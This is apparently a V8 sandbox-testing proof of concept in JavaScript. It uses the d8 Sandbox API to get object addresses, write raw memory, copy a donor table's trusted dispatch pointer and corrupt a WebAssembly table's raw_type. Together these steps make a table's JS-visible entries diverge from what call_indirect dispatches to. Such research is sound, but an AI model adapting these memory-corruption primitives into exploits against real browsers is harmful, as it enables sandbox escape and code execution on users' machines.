// C21 H34: visible/hidden table divergence using JS API for entries write.
//
// Like H33, but after corrupting victim.raw_type to externref and growing, use
// victim.set(1, visible) through the ordinary JS Table API. Since raw_type says
// externref at that moment, the API updates the entries array only and does not
// update the function dispatch table. Restoring raw_type to typed funcref then
// leaves visible table state and hidden dispatch state disagreeing. We compare
// JS API `table.get(1)` with Wasm `call_indirect(1)`.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return read32(tagged(table) + kRawTypeOffset - kHeapObjectTag);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('base', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x10), kExprI32Add])
      .exportFunc();
  b.addFunction('hidden', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x20), kExprI32Add])
      .exportFunc();
  b.addFunction('visible', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x70), kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

function makeTypedTable2(f0, f1) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let table = b.addTable(wasmRefNullType(sig), 2, 3).exportAs('table');
  b.addImportedGlobal('imp', 'f0', wasmRefNullType(sig), false);
  b.addImportedGlobal('imp', 'f1', wasmRefNullType(sig), false);
  b.addActiveElementSegment(
      table.index, wasmI32Const(0),
      [[kExprGlobalGet, 0], [kExprGlobalGet, 1]], wasmRefNullType(sig));
  return b.instantiate({imp: {f0, f1}}).exports.table;
}

function makeTypedTable1(f0) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let table = b.addTable(wasmRefNullType(sig), 1, 3).exportAs('table');
  b.addImportedGlobal('imp', 'f0', wasmRefNullType(sig), false);
  b.addActiveElementSegment(
      table.index, wasmI32Const(0), [[kExprGlobalGet, 0]],
      wasmRefNullType(sig));
  return b.instantiate({imp: {f0}}).exports.table;
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, wasmRefNullType(sig));
  b.addFunction('call_indirect_i_i', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports;
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let {base, hidden, visible} = makeTargets();

let donor = makeTypedTable2(base, hidden);
let victim = makeTypedTable1(base);
let funcrefRawTypeSmi = rawTypeField(victim);

print(`funcref_raw=0x${funcrefRawTypeSmi.toString(16)}`);
print(`externref_raw=0x${externRefRawTypeSmi.toString(16)}`);

write32(addrof(victim) + kTrustedDispatchTableOffset,
        read32(addrof(donor) + kTrustedDispatchTableOffset));
corruptRawType(victim, externRefRawTypeSmi);

victim.grow(2, null);
victim.set(1, visible);
print(`visible_direct=${visible(5)}`);
print(`victim_get1_is_visible=${victim.get(1) === visible}`);

corruptRawType(victim, funcrefRawTypeSmi);
let caller = makeCaller(victim);

try {
  print(`call_indirect_entry1=${caller.call_indirect_i_i(1, 5)}`);
} catch (e) {
  print(`call_indirect_entry1_throw=${e.name}:${e.message}`);
}
